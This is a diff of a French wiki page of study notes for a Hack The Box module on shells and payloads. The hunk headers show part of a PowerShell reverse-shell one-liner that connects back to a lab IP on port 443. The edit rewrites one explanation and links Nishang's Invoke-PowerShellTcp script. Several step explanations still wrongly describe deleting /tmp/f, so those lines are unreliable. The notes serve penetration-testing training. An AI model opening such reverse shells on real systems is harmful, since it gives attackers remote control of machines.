@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T19:51:25.569Z
+date: 2025-05-17T19:56:28.738Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -200,7 +200,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 ```
 
 1. **`powershell -nop -c `**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
+   La commande exécute PowerShell sans charger de profil (-nop) et exécute une commande ou un bloc de script spécifié entre guillemets grâce à l'option -c. Cette commande PowerShell est utilisée depuis cmd.exe, utile en cas de faille RCE permettant d'exécuter des commandes via cmd.exe sans se trouver à la base dans le shell PowerShell.
    
 1. **`"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);`**
    Supprime le fichier `/tmp/f` s’il existe déjà.
@@ -228,3 +228,5 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 
 1. **`$client.Close()"`**
    Supprime le fichier `/tmp/f` s’il existe déjà.
+
+Il est possible d'avoir le même résultat en passant par un script PowerShell et non un one-liner. Par exemple avec la cmdlet [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) du projet Nishang.
